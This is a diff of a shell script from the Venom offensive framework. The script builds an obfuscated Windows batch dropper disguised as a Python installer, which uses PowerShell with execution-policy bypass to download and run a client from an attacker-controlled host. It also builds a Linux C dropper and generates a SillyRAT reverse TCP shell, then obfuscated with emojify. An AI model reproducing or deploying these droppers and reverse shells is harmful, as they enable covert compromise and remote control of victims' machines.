@@ -10335,10 +10335,10 @@ if [ "$SOSP" = "Windows" ]; then
       echo ":: Framework: Venom v1.0.17 - shinigami" > $Drop.bat
       echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" >> $Drop.bat
       echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1 -C&&set \$i=py&&set #?=." >> $Drop.bat
-      echo ",i%'$%f n%i@%ot DEF%_@$%INE%@h%D IS_MIN%@$%IMI%,;f%ZE%i?%D se%@$%t IS_MIN%_#t%IMIZ%@=i%ED=1 &%@$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $Drop.bat
+      echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D IS_MIN%@$%IMI%,;f%ZE%i?%D se%@$%t IS_MIN%_#t%IMIZ%@=i%ED=1 &%@$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $Drop.bat
       echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
-      echo "@Po%@i%wE^r%@i%s^He%@i%ll (nE%@%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\"\"\",5,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $Drop.bat
-      echo "=pOw^e%@%rS^hE%@%lL -e^X%@%e\"C\" b%@%Y\"p\"a^S%@%s %\$\$% (nE%@%W-Obj%@%eCt N%i%Et%#?%WeBCl%@%iE^n%@%t)%#?%Dow%@%nL^oa%@%dFIl%@%E('h^t%@%t^p:/%@%/$lhost/$Drop.%\$i%', '$rpath\\$Drop.%\$i%') &%@_%& ,(,;(c%@$%d $rpath &%@%& pY%@%t^H%@%o\"N\" $Drop.%\$i%),)" >> $Drop.bat
+      echo "@Po%@i%wE^r%@i%s^He%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\"\"\",4,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $Drop.bat
+      echo "@pOw^e%@%rS^hE%@_%lL -e^X%@%e\"C\" b%@%Y\"p\"a^S%@%s %\$\$% (nE%@%W-Obj%@%eCt N%i%Et%#?%WeBCl%@%iE^n%@%t)%#?%Dow%@%nL^oa%@%dFIl%@%E('h^t%@%t^p:/%@%/$lhost/$Drop.%\$i%', '$rpath\\$Drop.%\$i%') &%@_%& ,(,;(c%@$%d $rpath &%@%& pY%@%t^H%@%o\"N\" $Drop.%\$i%),)" >> $Drop.bat
       echo "${BlueF}[☠]${white} Written $Drop.bat (obfuscated)"${Reset};sleep 2
 
    else
@@ -10365,8 +10365,8 @@ elif [ "$SOSP" = "Linux" ]; then
       if [ -z "$delayTime" ]; then delayTime="40";fi
 
       ## BUILD DROPPER (Install python3/Download/Execute Client.py)
-      echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
-      echo "${BlueF}[☠]${white} Client.py delayTime: $delayTime (sec)"${Reset};
+      echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 1
+      echo "${BlueF}[☠]${white} Client.py delayTime: $delayTime (sec)"${Reset};sleep 2
       echo "#include<stdio.h>" > $Drop.c
       echo "#include<stdlib.h>" >> $Drop.c
       echo "#include<string.h>" >> $Drop.c
@@ -10375,7 +10375,7 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "#include<unistd.h>" >> $Drop.c
       echo "" >> $Drop.c
       echo "/*" >> $Drop.c
-      echo "Author: r00t-3xp10it [SSA RedTeam @2020]" >> $Drop.c
+      echo "Author: r00t-3xp10it (SSA RedTeam @2020)" >> $Drop.c
       if [ "$vbsevasion" = "ON" ]; then
          echo "Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.c
       else
@@ -10435,23 +10435,25 @@ fi
 
 cd $IPATH/bin/SillyRAT
 ## Writting Client reverse tcp python shell to output
-echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
+echo "${BlueF}[☠]${white} Writting Client reverse tcp shell to output."${Reset};sleep 2
 xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
 
 
 cd $IPATH/output
-## Make sure emojify obfuscator its installed
+## OBFUSCATION: Make sure emojify obfuscator its installed
 # Author: @chris-rands (https://github.com/chris-rands/emojify)
 if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
+   echo "${BlueF}[☠]${white} Obfuscate Client.py rev shell (emojify)"${Reset};sleep 2
    audit=$(pip3 show emojify) > /dev/null 2>&1
    if [ "$?" -ne "0" ]; then
-      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing emojify python obfuscator."${Reset};sleep 2
+      echo "${RedF}[ERROR] emojify obfuscator not found.${white}";sleep 2
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing emojify obfuscator."${Reset};
       echo "" && sudo apt-get update && pip3 install emojify && echo ""
    fi
    ## Obfuscate Client.py sourcecode using emojify
    emojify --input $Drop.py --output obfuscated.py > /dev/nul 2>&1
    mv obfuscated.py $Drop.py > /dev/nul 2>&1
-   echo "${BlueF}[☠]${white} $Drop.py Obfuscated (emojify)"${Reset};sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} $Drop.py successfully obfuscated."${Reset};sleep 2
 fi
 
 
